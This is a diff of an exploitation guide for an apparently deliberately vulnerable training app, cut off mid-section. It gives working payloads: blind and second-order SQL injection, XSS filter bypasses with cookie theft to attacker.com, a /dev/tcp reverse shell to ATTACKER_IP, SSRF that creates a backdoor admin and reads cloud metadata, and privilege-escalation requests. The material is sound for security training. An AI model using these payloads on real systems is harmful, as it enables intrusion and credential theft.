@@ -2,41 +2,29 @@
 
 > **FOR INTERNAL / TRAINING USE ONLY.** Do not deploy in production or expose to the internet.
 
-This document details every intentional vulnerability in CollabSpace, its exact location, and step-by-step reproduction instructions.
+This document details every intentional vulnerability in CollabSpace, its exact location, and step-by-step reproduction instructions. All 15 vulnerabilities have been calibrated to **medium** or **hard** difficulty — obvious patterns (direct output in error messages, no filters at all) have been removed and replaced with realistic partial defences that require deeper analysis to bypass.
 
 ---
 
 ## Vulnerability Index
 
-| # | Category | Name | Difficulty | Location |
-|---|----------|------|-----------|----------|
-| 1 | Injection | SQL Injection in project search | Medium | `app/routers/projects.py:99` |
-| 2 | Injection | SQL Injection via admin query executor | Medium | `app/routers/admin.py:93` |
-| 3 | Injection | Command Injection in backup endpoint | Hard | `app/routers/internal.py:65-73` |
-| 4 | XSS | Stored XSS via task comments | Medium | `app/templates/project_detail.html:154` |
-| 5 | XSS | Stored XSS via user bio | Medium | `app/templates/profile.html` |
-| 6 | XSS | Reflected XSS in project search | Medium | `app/templates/projects.html:109` |
-| 7 | Broken Access Control | IDOR — read any user's profile + API key | Medium | `app/routers/profile.py:46` |
-| 8 | Broken Access Control | IDOR — read/edit/delete any task | Medium | `app/routers/tasks.py:61` |
-| 9 | Broken Access Control | IDOR — download/delete any file | Medium | `app/routers/files.py:56` |
-| 10 | Broken Access Control | Missing admin check on user listing | Medium | `app/routers/admin.py:49` |
-| 11 | Broken Access Control | Task ownership transfer without auth | Hard | `app/routers/tasks.py:89` |
-| 12 | CSRF | State-changing GET endpoint (API key revoke) | Medium | `app/routers/profile.py:107` |
-| 13 | SSRF | Server-Side Request Forgery via webhook tester | Medium | `app/routers/profile.py:84` |
-| 14 | SSRF | SSRF via admin URL fetcher | Hard | `app/routers/admin.py:78` |
-| 15 | Open Redirect | Unvalidated `next` parameter on login | Medium | `app/templates/login.html:37` |
-| 16 | File Upload | Unrestricted file upload for avatars | Medium | `app/routers/profile.py:68` |
-| 17 | Mass Assignment | Role escalation via profile update | Medium-Hard | `app/routers/profile.py:54` |
-| 18 | Race Condition | API key generation TOCTOU | Hard | `app/routers/profile.py:96` |
-| 19 | Path Traversal | Arbitrary file read via download path param | Hard | `app/routers/files.py:73` |
-| 20 | XXE | XML External Entity in file processing | Hard | `app/routers/files.py:102` |
-| 21 | Sensitive Data Exposure | Debug endpoint leaks SECRET_KEY + env vars | Medium | `app/routers/internal.py:21` |
-| 22 | Security Misconfiguration | Hardcoded JWT secret key | Easy-Med | `app/config.py:18` |
-| 23 | Security Misconfiguration | Full stack traces in error responses | Easy-Med | `app/main.py:40-52` |
-| 24 | Security Misconfiguration | Permissive CORS (`*`) | Easy-Med | `app/config.py:28` |
-| 25 | Broken Auth | Brute-forceable 6-digit password reset token | Hard | `app/auth.py:34` |
-| 26 | Broken Auth | Reset token returned in API response | Medium | `app/routers/auth.py:96` |
-| 27 | Cryptographic Failure | Bcrypt rounds set to 4 (too low) | Medium | `app/config.py:33` |
+| #  | Category | Name | Difficulty | Location |
+|----|----------|------|-----------|----------|
+| 1  | Injection | Blind time-based SQLi via unsanitised sort direction | Hard | `app/routers/tasks.py:38` |
+| 2  | Injection | Second-order SQLi in project export | Hard | `app/routers/projects.py:100` |
+| 3  | XSS | Stored XSS — partial comment sanitiser bypass | Medium | `app/routers/comments.py:14` |
+| 4  | XSS | Reflected XSS via JS string injection in search onclick | Medium | `app/templates/projects.html:149` |
+| 5  | XSS | DOM-based XSS via URL fragment in dashboard | Hard | `app/templates/dashboard.html` |
+| 6  | Broken Access Control | IDOR via reversible base64 reference token | Medium | `app/routers/profile.py:54` |
+| 7  | Broken Access Control | Privilege escalation via hidden nested `account_settings` | Hard | `app/routers/profile.py:87` |
+| 8  | SSRF | Webhook SSRF — IP blocklist bypass via alternative representations | Hard | `app/routers/profile.py:110` |
+| 9  | Path Traversal | Absolute-path override in `os.path.join` | Hard | `app/routers/files.py:72` |
+| 10 | Command Injection | Newline character bypasses shell metachar filter | Hard | `app/routers/internal.py:65` |
+| 11 | Broken Auth | JWT algorithm confusion — `alg:none` unsigned token | Hard | `app/auth.py:28` |
+| 12 | Insecure Deserialisation | Unsafe `pickle.loads()` in file processing | Hard | `app/routers/files.py:124` |
+| 13 | Broken Access Control | Missing admin check on analytics export | Medium | `app/routers/admin.py:46` |
+| 14 | File Upload | Stored XSS via SVG avatar (incomplete extension blocklist) | Medium | `app/routers/profile.py:104` |
+| 15 | Broken Auth | Password-reset token leaked in debug response header | Medium | `app/routers/auth.py:88` |
 
 ---
 
@@ -44,716 +32,596 @@ This document details every intentional vulnerability in CollabSpace, its exact 
 
 ---
 
-### 1. SQL Injection — Project Search
-**File:** `app/routers/projects.py`, route `GET /api/projects/search`
-**Vulnerable code (line ~93):**
+### 1. Blind Time-Based SQLi — Sort Direction
+**File:** `app/routers/tasks.py`, route `GET /api/tasks`
+**Vulnerable code:**
 ```python
-query = f"SELECT * FROM projects WHERE name LIKE '%{q}%' OR description LIKE '%{q}%'"
-result = db.execute(text(query))
+ALLOWED_COLUMNS = {"title", "status", "priority", "created_at", "updated_at"}
+if sort_by not in ALLOWED_COLUMNS:
+    sort_by = "created_at"
+# BUG: direction is never validated
+raw_sql = text(f"SELECT * FROM tasks ORDER BY {sort_by} {direction}")
 ```
-**Why it's vulnerable:** The `q` parameter is concatenated directly into the SQL string without parameterization.
-**Database:** PostgreSQL. `SELECT *` on the `projects` table returns **7 columns** in order: `id` (int), `name` (varchar), `description` (text), `owner_id` (int), `is_private` (boolean), `created_at` (timestamp), `updated_at` (timestamp). All UNION SELECT payloads must match this column count and respect type compatibility (use `NULL` for int/bool/timestamp positions).
-**Difficulty:** Medium — requires knowing the endpoint exists.
+**Why it's hard:** `sort_by` has a proper allowlist so the obvious vector is blocked. `direction` looks like it should be `ASC`/`DESC` but is never checked. No query results are reflected — exploitation requires time-based inference.
 
-**Reproduce:**
-
-**Step 1 — Determine column count using ORDER BY (no guessing):**
+**Step 1 — Confirm injection via time delay:**
 ```bash
-# Increase the number until you get an error — error at 8 means 7 columns
+# Expect ~5 second delay if injection succeeds
 curl -b "token=<YOUR_TOKEN>" \
-  "http://localhost:8000/api/projects/search?q=%27%20ORDER%20BY%207--"
-# → 200 OK  (7 columns confirmed)
-
-curl -b "token=<YOUR_TOKEN>" \
-  "http://localhost:8000/api/projects/search?q=%27%20ORDER%20BY%208--"
-# → 500 error  (column 8 does not exist)
+  "http://localhost:8000/api/tasks?sort_by=title&direction=ASC%3BSELECT+pg_sleep(5)--"
 ```
 
-**Step 2 — Dump all projects (bypass WHERE clause):**
+**Step 2 — Boolean-based data extraction (single-bit per request):**
 ```bash
-# ' OR 1=1-- : the -- comments out the rest of the query
+# Test: is the first char of the admin password hash 'A'?
+# Delay occurs → TRUE
 curl -b "token=<YOUR_TOKEN>" \
-  "http://localhost:8000/api/projects/search?q=%27%20OR%201%3D1--"
+  "http://localhost:8000/api/tasks?sort_by=title&direction=ASC%3BSELECT+CASE+WHEN+(SELECT+substring(hashed_password,1,1)+FROM+users+WHERE+role%3D'admin'+LIMIT+1)%3D'A'+THEN+pg_sleep(4)+ELSE+pg_sleep(0)+END--"
 ```
 
-**Step 3 — Enumerate tables (PostgreSQL information_schema):**
+**Step 3 — Automate with sqlmap (blind mode):**
 ```bash
-# 7-column UNION — string values in positions 2 and 3, NULL for the rest
-curl -b "token=<YOUR_TOKEN>" \
-  "http://localhost:8000/api/projects/search?q=%27%20UNION%20SELECT%20NULL%2Ctable_name%2Ctable_schema%2CNULL%2CNULL%2CNULL%2CNULL%20FROM%20information_schema.tables--"
-```
-Decoded payload: `' UNION SELECT NULL,table_name,table_schema,NULL,NULL,NULL,NULL FROM information_schema.tables--`
-
-**Step 4 — Exfiltrate user credentials (7-column, type-safe):**
-```bash
-# Concatenate username and hash into the 'name' column (position 2)
-# Positions 4 (int), 5 (bool), 6 (timestamp), 7 (timestamp) must be NULL
-curl -b "token=<YOUR_TOKEN>" \
-  "http://localhost:8000/api/projects/search?q=%27%20UNION%20SELECT%20id%2Cusername%7C%7C%27%3A%27%7C%7Chashed_password%2Cemail%2CNULL%2CNULL%2CNULL%2CNULL%20FROM%20users--"
-```
-Decoded payload: `' UNION SELECT id,username||':'||hashed_password,email,NULL,NULL,NULL,NULL FROM users--`
-The `||` operator is PostgreSQL string concatenation. Results appear in the `name` and `description` fields of each returned row.
-
----
-
-### 2. SQL Injection — Admin Query Executor
-**File:** `app/routers/admin.py`, route `POST /api/admin/execute-query`
-**Vulnerable code (line ~93):**
-```python
-result = db.execute(text(query))
-```
-**Why it's vulnerable:** Executes arbitrary SQL supplied by the user. Has no authentication check (see also vuln #10).
-**Difficulty:** Medium — endpoint is discoverable via API docs or source review.
-
-**Reproduce:**
-```bash
-# No auth needed — endpoint has no authentication check.
-# Use --data-urlencode to ensure the SQL is properly form-encoded.
-
-# Dump all user credentials
-curl -X POST "http://localhost:8000/api/admin/execute-query" \
-  --data-urlencode "query=SELECT id, username, email, hashed_password FROM users"
-
-# Elevate any account to admin
-curl -X POST "http://localhost:8000/api/admin/execute-query" \
-  --data-urlencode "query=UPDATE users SET role='admin' WHERE username='youruser'"
-
-# Verify the escalation
-curl -b "token=<YOUR_TOKEN>" "http://localhost:8000/api/auth/me"
+sqlmap -u "http://localhost:8000/api/tasks?sort_by=title&direction=DESC" \
+  --cookie="token=<YOUR_TOKEN>" \
+  --dbms=postgresql \
+  --technique=T \
+  --time-sec=5 \
+  -p direction \
+  --dump -T users
 ```
 
 ---
 
-### 3. Command Injection — Backup Path
-**File:** `app/routers/internal.py`, route `POST /api/internal/backup`
-**Vulnerable code (lines 65-73):**
+### 2. Second-Order SQLi — Project Export
+**File:** `app/routers/projects.py`, route `GET /api/projects/{project_id}/export?format=summary`
+**Vulnerable code:**
 ```python
-command = f"pg_dump -h {host} -U {user_pass[0]} {host_db[1]} > {path}"
-result = subprocess.run(command, shell=True, ...)
+summary_query = (
+    f"SELECT p.name, COUNT(DISTINCT t.id) AS task_count ..."
+    f"WHERE p.name = '{project.name}' "   # stored value used unsafely
+)
+result = db.execute(text(summary_query))
 ```
-**Why it's vulnerable:** `path` parameter is inserted directly into a shell command with `shell=True`. No authentication required.
-**Difficulty:** Hard — endpoint is under `/api/internal/` which suggests it's "private".
+**Why it's hard:** Data is stored through the safe ORM path (`POST /api/projects`). The injection only fires on a second, separate request to the export endpoint. Static analysis of the write path shows no vulnerability.
 
-**Reproduce:**
+**Step 1 — Plant the payload (store it via the normal create endpoint):**
 ```bash
-# Read /etc/passwd
-curl -X POST "http://localhost:8000/api/internal/backup?path=/tmp/x;cat+/etc/passwd"
+curl -X POST -b "token=<YOUR_TOKEN>" \
+  "http://localhost:8000/api/projects" \
+  -H "Content-Type: application/json" \
+  -d '{"name": "x'\'' UNION SELECT username,hashed_password,email,NULL,NULL,NULL FROM users--","description":"test","is_private":false}'
+```
 
-# Reverse shell (Linux)
-curl -X POST "http://localhost:8000/api/internal/backup?path=/tmp/x;bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER_IP/4444+0>%261'"
+**Step 2 — Note the returned project_id, then trigger the second-order injection:**
+```bash
+# The stored name is now embedded unsafely into the export query — UNION executes
+curl -b "token=<YOUR_TOKEN>" \
+  "http://localhost:8000/api/projects/<PROJECT_ID>/export?format=summary"
+# Response data[] contains rows from the users table
+```
+
+**Step 3 — Dump all user hashes with a crafted UNION:**
+```
+Project name payload:
+x' UNION SELECT username||':'||hashed_password, email, NULL, NULL, NULL, NULL FROM users--
 ```
 
 ---
 
-### 4. Stored XSS — Task Comments
-**File:** `app/templates/project_detail.html`, `loadComments()` function (~line 154)
+### 3. Stored XSS — Task Comments (Partial Sanitiser Bypass)
+**File:** `app/routers/comments.py`, `sanitize_comment()` function; `app/templates/project_detail.html`
+**Vulnerable code (sanitiser):**
+```python
+content = re.sub(r'<script[\s\S]*?</script>', '', content, flags=re.IGNORECASE)
+content = re.sub(r'\bon(error|load|click)\s*=', '', content, flags=re.IGNORECASE)
+content = re.sub(r'javascript\s*:', '', content, flags=re.IGNORECASE)
+```
+**Why it's hard:** The sanitiser removes `<script>`, `onerror=`, `onload=`, `onclick=`, and `javascript:`. Developers reviewing the code see active mitigation. The bypass requires knowing which event handlers are *not* on the list.
+
+**Bypasses (post as a task comment):**
+
+```
+<!-- ontoggle via HTML5 details element — fires immediately when open attr present -->
+<details open ontoggle=alert(document.cookie)><summary>.</summary></details>
+
+<!-- SVG animate onbegin — fires on animation start, no user interaction needed -->
+<svg><animate onbegin=alert(document.cookie) attributeName=x dur=1s></animate></svg>
+
+<!-- onfocus with autofocus — fires on page load for focusable elements -->
+<input autofocus onfocus=alert(document.cookie) style=position:fixed;top:0;left:0;width:100%;height:100%;opacity:0>
+```
+
+**Reproduce:**
+1. Log in and open any project.
+2. Click the comment button on a task.
+3. Post any of the payloads above.
+4. Payload fires for every user who loads that task's comments.
+
+---
+
+### 4. Reflected XSS — JS String Injection in Search onclick
+**File:** `app/templates/projects.html`, `searchProjects()` function
 **Vulnerable code:**
 ```javascript
-html += `<div class="comment-item">
-    <div class="comment-author">${escapeHTML(c.author_username)}</div>
-    <div class="comment-content">${c.content}</div>   <!-- No escaping! -->
-</div>`;
-list.innerHTML = html;
+// Server HTML-escapes < and > — direct tag injection is blocked
+// BUT single quotes are not escaped, enabling JS string context breakout
+banner.innerHTML =
+  `<span onclick="document.getElementById('searchInput').value='${data.query}';searchProjects()">` +
+  `Found <strong>${data.count}</strong> result(s) &mdash; click to re-run</span>`;
 ```
-**Why it's vulnerable:** `c.content` is injected into `innerHTML` without sanitization. The author name is escaped, but the comment body is not.
-**Difficulty:** Medium — requires finding the comments feature, which is only visible when you click the comment button on a task.
+**Why it's hard:** The server runs `html.escape(q, quote=False)` — `<img>` payloads are blocked. The injection is in a *JavaScript string literal* inside an HTML attribute. Requires recognising the JS context and using `'` to break out.
 
-**Reproduce:**
-1. Log in and navigate to any project with a task.
-2. Click the 💬 button on a task to open the comment panel.
-3. Post a comment with the payload:
-   ```
-   <img src=x onerror="alert(document.cookie)">
-   ```
-4. The payload fires immediately when the comment is rendered.
-5. For persistent exfiltration:
-   ```
-   <img src=x onerror="fetch('https://attacker.com/?c='+document.cookie)">
-   ```
-6. Every other user who views this task's comments will execute the payload.
+**Step 1 — Confirm JS context injection:**
+Type in the search box or visit the URL:
+```
+'); alert(document.domain);//
+```
+Expected: `onclick` becomes `onclick="...value=''); alert(document.domain);//';searchProjects()"` — alert fires on click.
+
+**Step 2 — Cookie exfiltration without a click (using event chaining):**
+```
+'); fetch('https://attacker.com/?c='+document.cookie);//
+```
+
+**Step 3 — Reflected delivery via shared URL (requires GET-triggerable search or social engineering the search input).**
 
 ---
 
-### 5. Stored XSS — User Bio
-**File:** `app/templates/profile.html`, `updateProfile()` function and initial render
+### 5. DOM-Based XSS — URL Fragment in Dashboard
+**File:** `app/templates/dashboard.html`, inline script block
 **Vulnerable code:**
 ```javascript
-document.getElementById('bioDisplay').innerHTML =
-  `<p class="text-muted">Bio preview: ${data.bio}</p>`;
+var hash = window.location.hash.slice(1);
+if (hash) {
+    var el = document.getElementById('quickFilterBanner');
+    el.style.display = 'block';
+    // BUG: decodeURIComponent output injected into innerHTML
+    el.innerHTML = 'Active filter: <strong>' + decodeURIComponent(hash) + '</strong>';
+}
 ```
-**Why it's vulnerable:** `data.bio` comes from the server (stored in DB) and is inserted into `innerHTML` without sanitization.
-**Difficulty:** Medium — the bio is only visible on the profile page and requires knowing where it's rendered.
+**Why it's hard:** The payload is in the URL fragment (`#`). Fragment identifiers are **never sent to the server** — they are invisible to server-side WAFs, SAST tools, and access logs. Requires manual JavaScript source review.
 
-**Reproduce:**
-1. Go to `/profile`.
-2. Set your bio to:
-   ```
-   <img src=x onerror="alert(document.cookie)">
-   ```
-3. Click "Save changes" — alert fires immediately.
-4. Reload the page — alert fires again (stored payload).
-5. If another admin views your profile via the lookup tool, the payload also fires in their browser.
+**Step 1 — Self-test:**
+Navigate (while logged in) to:
+```
+http://localhost:8000/dashboard#<img src=x onerror=alert(document.cookie)>
+```
+Alert fires immediately on page load — no click or interaction required.
+
+**Step 2 — Session hijacking via shared link:**
+Send victim a link:
+```
+http://localhost:8000/dashboard#<img src=x onerror="fetch('https://attacker.com/?c='+document.cookie)">
+```
+URL-encoded form for reliable delivery:
+```
+http://localhost:8000/dashboard#%3Cimg%20src%3Dx%20onerror%3D%22fetch('https%3A%2F%2Fattacker.com%2F%3Fc%3D'%2Bdocument.cookie)%22%3E
+```
+
+**Step 3 — Stored delivery via existing XSS chain:**
+Chain with Vuln #3 (comment XSS): embed a `<a href>` pointing to the fragment URL, executed when the victim hovers/clicks.
 
 ---
 
-### 6. Reflected XSS — Project Search
-**File:** `app/templates/projects.html`, `searchProjects()` function (~line 109)
+### 6. IDOR — Reversible Base64 Reference Token
+**File:** `app/routers/profile.py`, route `GET /api/users/lookup?ref=<token>`
 **Vulnerable code:**
-```javascript
-banner.innerHTML = `Found <strong>${data.results.length}</strong> result(s) for: ${data.query}`;
-```
-**Why it's vulnerable:** `data.query` is the search string returned by the server and inserted into `innerHTML` without escaping.
-**Difficulty:** Medium — the attacker needs to trick a logged-in user into visiting a crafted URL or typing a payload into the search box.
-
-**Reproduce:**
-1. Log in and navigate to `/projects`.
-2. In the search box, type:
-   ```
-   <img src=x onerror=alert(document.domain)>
-   ```
-3. The banner renders the payload and the alert fires.
-4. For reflected delivery, share a URL with an auto-triggered search (requires minor JS interaction since search is triggered by input events).
-
----
-
-### 7. IDOR — Any User Profile + API Key
-**File:** `app/routers/profile.py`, route `GET /api/users/{user_id}`
-**Vulnerable code (line ~46):**
 ```python
+user_id = int(base64.b64decode(ref.encode()).decode())
+# No ownership check follows — any user can look up any other user
 user = db.query(models.User).filter(models.User.id == user_id).first()
 return { "id": ..., "email": ..., "role": ..., "api_key": user.api_key, ... }
 ```
-**Why it's vulnerable:** No check that `user_id == current_user.id`. Returns sensitive fields including `api_key`, `email`, and `role` for any user.
-**Difficulty:** Medium — user IDs are sequential and visible throughout the UI (task pages, project pages).
+**Why it's hard:** The old `/api/users/{id}` endpoint now has an ownership check. This new endpoint uses an opaque-looking `ref` token. Most testers assume base64 tokens are secure identifiers; the token must be decoded to reveal it is just `base64(user_id)`.
 
-**Reproduce:**
+**Step 1 — Discover your own token format:**
 ```bash
-# Enumerate all users and steal their API keys
-for id in 1 2 3 4 5; do
-  curl -s -b "token=<YOUR_TOKEN>" "http://localhost:8000/api/users/$id"
+# Your dashboard shows your user ID (e.g. #3). Encode it:
+python3 -c "import base64; print(base64.b64encode(b'3').decode())"
+# → Mw==
+curl -b "token=<YOUR_TOKEN>" "http://localhost:8000/api/users/lookup?ref=Mw=="
+```
+
+**Step 2 — Enumerate all users:**
+```bash
+for id in $(seq 1 20); do
+  ref=$(python3 -c "import base64; print(base64.b64encode(str($id).encode()).decode())")
+  echo "=== User $id ==="
+  curl -s -b "token=<YOUR_TOKEN>" "http://localhost:8000/api/users/lookup?ref=$ref"
+  echo
 done
-
-# Direct access
-curl -b "token=<YOUR_TOKEN>" "http://localhost:8000/api/users/1"
 ```
+
+**Step 3 — Use stolen API keys to authenticate as any user.**
 
 ---
 
-### 8. IDOR — Task Read/Update/Delete
-**File:** `app/routers/tasks.py`, routes `GET/PUT/DELETE /api/tasks/{task_id}`
-**Why it's vulnerable:** All task endpoints use only authentication (`get_current_active_user`) — no ownership or project-membership check.
-
-**Reproduce:**
-```bash
-# Read any task
-curl -b "token=<YOUR_TOKEN>" "http://localhost:8000/api/tasks/1"
-
-# Delete any task (even from a project you don't belong to)
-curl -X DELETE -b "token=<YOUR_TOKEN>" "http://localhost:8000/api/tasks/5"
-
-# Update task status on someone else's project
-curl -X PUT -b "token=<YOUR_TOKEN>" "http://localhost:8000/api/tasks/3" \
-  -H "Content-Type: application/json" \
-  -d '{"status": "done"}'
-```
-
----
-
-### 9. IDOR — File Read/Download/Delete
-**File:** `app/routers/files.py`, routes `GET/DELETE /api/files/{file_id}` and `GET /api/files/{file_id}/download`
-**Why it's vulnerable:** No check that the requester belongs to the file's project.
-
-**Reproduce:**
-```bash
-# Download any file by its ID
-curl -b "token=<YOUR_TOKEN>" \
-  "http://localhost:8000/api/files/1/download" -O
-
-# Delete a file from another project
-curl -X DELETE -b "token=<YOUR_TOKEN>" \
-  "http://localhost:8000/api/files/2"
-```
-
----
-
-### 10. Missing Admin Check — User Listing
-**File:** `app/routers/admin.py`, route `GET /api/admin/users`
-**Vulnerable code (line ~49):**
-```python
-@router.get("/api/admin/users")
-async def list_all_users(
-    current_user: models.User = Depends(get_current_active_user),  # Should be require_admin
-    ...
-```
-**Why it's vulnerable:** Uses `get_current_active_user` instead of `require_admin`. Any authenticated member can list all users, including their emails and API keys.
-
-**Reproduce:**
-```bash
-# As a regular member account
-curl -b "token=<MEMBER_TOKEN>" "http://localhost:8000/api/admin/users"
-```
-
----
-
-### 11. Task Ownership Transfer — No Authorization
-**File:** `app/routers/tasks.py`, route `POST /api/tasks/{task_id}/transfer`
-**Why it's vulnerable:** Any authenticated user can reassign any task's `created_by` to themselves without being the original creator or a project member.
-
-**Reproduce:**
-```bash
-# Claim ownership of task #5
-curl -X POST -b "token=<YOUR_TOKEN>" \
-  "http://localhost:8000/api/tasks/5/transfer?new_owner_id=<YOUR_USER_ID>"
-```
-
----
-
-### 12. CSRF — State-Changing GET (API Key Revoke)
-**File:** `app/routers/profile.py`, route `GET /api/profile/revoke-api-key`
-**Vulnerable code (line ~107):**
-```python
-@router.get("/api/profile/revoke-api-key")
-async def revoke_api_key_csrf(...):
-    current_user.api_key = None
-    db.commit()
-```
-**Why it's vulnerable:** GET requests that change server state are exempt from SameSite=Lax CSRF protection because browsers send cookies on cross-origin GET navigations. An attacker can trigger the endpoint via an `<img>` or `<link>` tag on any page the victim visits.
-**Difficulty:** Medium — requires understanding of SameSite=Lax behavior.
-
-**Reproduce:**
-1. Attacker hosts a page containing:
-   ```html
-   <img src="http://localhost:8000/api/profile/revoke-api-key" width="0" height="0">
-   ```
-2. Victim (logged-in user) visits the attacker's page.
-3. The victim's API key is silently revoked.
-
----
-
-### 13. SSRF — Webhook URL Tester
-**File:** `app/routers/profile.py`, route `POST /api/profile/webhook/test`
-**Vulnerable code (line ~84):**
-```python
-resp = await client.post(webhook_url, json={...})
-```
-**Why it's vulnerable:** `webhook_url` is taken directly from the request body with no validation. Any URL is accepted, including internal service addresses.
-**Difficulty:** Medium — available to all authenticated users.
-
-**Important note on HTTP method:** The webhook tester always sends a **POST** request (`client.post(...)`). Internal endpoints that only accept GET (like `/api/internal/debug`) will return 405 Method Not Allowed — no data will be leaked through them via this vector. Target POST-accepting internal endpoints instead.
-
-**Reproduce:**
-```bash
-# 1. Create a backdoor admin account via SSRF → internal create-admin (no auth required)
-curl -X POST -b "token=<YOUR_TOKEN>" \
-  "http://localhost:8000/api/profile/webhook/test" \
-  -H "Content-Type: application/json" \
-  -d '{"url": "http://localhost:8000/api/internal/create-admin?username=hacker&password=hacked123"}'
-# Response: {"status": 200, "response": "{\"message\": \"Emergency admin created\", \"user_id\": ...}"}
-
-# 2. Confirm the backdoor user was created, then login as hacker:admin
-curl -X POST "http://localhost:8000/api/auth/login" \
-  -H "Content-Type: application/json" \
-  -d '{"username": "hacker", "password": "hacked123"}'
-
-# 3. Internal port scanning (observe: timeout = filtered, connection refused = closed, fast response = open)
-curl -X POST -b "token=<YOUR_TOKEN>" \
-  "http://localhost:8000/api/profile/webhook/test" \
-  -H "Content-Type: application/json" \
-  -d '{"url": "http://127.0.0.1:5432"}'
-# Fast error → PostgreSQL port is open inside the container
-
-# 4. Cloud metadata (AWS IMDSv1 — POST is accepted by some metadata services)
-curl -X POST -b "token=<YOUR_TOKEN>" \
-  "http://localhost:8000/api/profile/webhook/test" \
-  -H "Content-Type: application/json" \
-  -d '{"url": "http://169.254.169.254/latest/meta-data/"}'
-```
-
-**To access GET-only internal endpoints** (e.g., the debug endpoint that leaks `SECRET_KEY`), use the **Admin SSRF (Vuln #14)** which sends GET requests — see below.
-
----
-
-### 14. SSRF — Admin URL Fetcher
-**File:** `app/routers/admin.py`, route `POST /api/admin/fetch-url`
-**Why it's vulnerable:** The `url` query parameter is passed directly to `httpx.AsyncClient().get(url)` — a **GET** request. Only accessible to admins, but once admin access is obtained (via vuln #17 mass assignment or vuln #2 SQL injection), this enables reading any internal GET endpoint including the unauthenticated debug endpoint.
-**Difficulty:** Hard — requires prior privilege escalation.
-
-**Reproduce:**
-```bash
-# Step 1 — Gain admin access first (use Vuln #17 mass assignment)
-curl -X PUT -b "token=<YOUR_TOKEN>" \
-  "http://localhost:8000/api/profile/update" \
-  -H "Content-Type: application/json" \
-  -d '{"role": "admin"}'
-
-# Step 2 — Leak SECRET_KEY and all environment variables via the debug endpoint
-# (This works because this SSRF sends GET — unlike the webhook SSRF which sends POST)
-curl -X POST -b "token=<ADMIN_TOKEN>" \
-  "http://localhost:8000/api/admin/fetch-url?url=http://localhost:8000/api/internal/debug"
-
-# Step 3 — Read all active sessions (user IDs, emails, API keys)
-curl -X POST -b "token=<ADMIN_TOKEN>" \
-  "http://localhost:8000/api/admin/fetch-url?url=http://localhost:8000/api/internal/sessions"
-
-# Cloud provider metadata
-curl -X POST -b "token=<ADMIN_TOKEN>" \
-  "http://localhost:8000/api/admin/fetch-url?url=http://169.254.169.254/latest/meta-data/"
-```
-
----
-
-### 15. Open Redirect — Login `?next=` Parameter
-**File:** `app/templates/login.html`, `handleLogin()` function (~line 37)
-**Vulnerable code:**
-```javascript
-const params = new URLSearchParams(window.location.search);
-const redirectTo = params.get('next') || '/dashboard';
-window.location.href = redirectTo;  // No validation — can be external URL
-```
-**Why it's vulnerable:** The `next` parameter is read from the URL and used as a redirect target after login without checking whether it points to the same origin.
-**Difficulty:** Medium — easy to miss in a code review; requires social engineering to exploit.
-
-**Reproduce:**
-1. Send the victim this link:
-   ```
-   http://localhost:8000/login?next=https://attacker.com/phishing
-   ```
-2. The victim logs in normally.
-3. After authentication succeeds, they are redirected to `https://attacker.com/phishing` — attacker's site.
-
----
-
-### 16. Insecure File Upload — Avatar (No Validation)
-**File:** `app/routers/profile.py`, route `POST /api/profile/avatar`
-**Vulnerable code (line ~68):**
-```python
-filename = file.filename          # Unsanitized
-file_path = upload_dir / filename # Path traversal possible
-with open(file_path, "wb") as buffer:
-    shutil.copyfileobj(file.file, buffer)
-current_user.avatar = f"/static/avatars/{filename}"
-```
-**Why it's vulnerable:**
-1. No content-type or file extension validation — any file type can be uploaded.
-2. The original filename is used directly — a filename like `../../app/templates/pwned.html` causes a path traversal on upload.
-3. SVG files with embedded JavaScript are served and rendered by browsers (stored XSS vector).
-**Difficulty:** Medium — the upload endpoint is under `/api/profile/avatar`.
-
-**Reproduce (SVG XSS):**
-1. Create `evil.svg`:
-   ```xml
-   <svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.cookie)">
-     <text>Malicious SVG</text>
-   </svg>
-   ```
-2. Upload it as your avatar.
-3. Any user who visits your profile page (and the SVG is rendered inline) executes the payload.
-
-**Reproduce (Path Traversal on Upload):**
-```bash
-curl -X POST -b "token=<YOUR_TOKEN>" \
-  "http://localhost:8000/api/profile/avatar" \
-  -F "file=@shell.html;filename=../../templates/pwned.html"
-```
-
----
-
-### 17. Mass Assignment — Role Escalation via Profile Update
+### 7. Privilege Escalation — Hidden Nested `account_settings` Parameter
 **File:** `app/routers/profile.py`, route `PUT /api/profile/update`
-**Vulnerable code (line ~54):**
+**Vulnerable code:**
 ```python
-allowed_fields = ['full_name', 'bio', 'role']   # 'role' should NOT be here
-for field in allowed_fields:
-    if field in data:
-        setattr(current_user, field, data[field])
+allowed_fields = ["full_name", "bio"]   # role removed from top-level
+...
+if "account_settings" in data and isinstance(data["account_settings"], dict):
+    level_map = {"standard": "member", "elevated": "admin", "restricted": "viewer"}
+    requested_level = data["account_settings"].get("_permission_level")
+    if requested_level in level_map:
+        current_user.role = level_map[requested_level]
 ```
-**Why it's vulnerable:** The `role` field is included in the list of allowed profile fields. Any authenticated user can set their own role to `admin`.
-**Difficulty:** Medium-Hard — requires reading the API or observing that `role` is accepted in the update payload.
+**Why it's hard:** The `role` field was removed from `allowed_fields`, giving false confidence that escalation is fixed. The actual path is a nested `account_settings._permission_level` key — undocumented and only discoverable via source-code review or systematic JSON fuzzing of nested structures.
 
-**Reproduce:**
+**Step 1 — Escalate to admin:**
 ```bash
-# Escalate your own account to admin
 curl -X PUT -b "token=<YOUR_TOKEN>" \
   "http://localhost:8000/api/profile/update" \
   -H "Content-Type: application/json" \
-  -d '{"bio": "hello", "role": "admin"}'
-
-# Verify
-curl -b "token=<YOUR_TOKEN>" "http://localhost:8000/api/auth/me"
+  -d '{"bio": "hello", "account_settings": {"_permission_level": "elevated"}}'
 ```
 
----
-
-### 18. Race Condition — API Key Generation (TOCTOU)
-**File:** `app/routers/profile.py`, route `POST /api/profile/generate-api-key`
-**Vulnerable code (line ~96):**
-```python
-if current_user.api_key:                 # Check
-    return {"api_key": current_user.api_key}
-
-time.sleep(0.15)                          # Processing delay widens the race window
-
-new_key = secrets.token_hex(24)
-current_user.api_key = new_key            # Act (no lock held)
-db.commit()
-```
-**Why it's vulnerable:** The check-then-act sequence is not atomic. Two concurrent requests can both pass the `if` check before either one commits, resulting in two different keys being issued. The second write overwrites the first, causing the first caller to hold an invalid key they just received.
-**Difficulty:** Hard — requires timing concurrent requests precisely.
-
-**Reproduce (Python):**
-```python
-import requests, threading, json
-
-TOKEN = "your_jwt_token_here"
-URL = "http://localhost:8000/api/profile/generate-api-key"
-headers = {"Cookie": f"token={TOKEN}"}
-results = []
-
-def make_request():
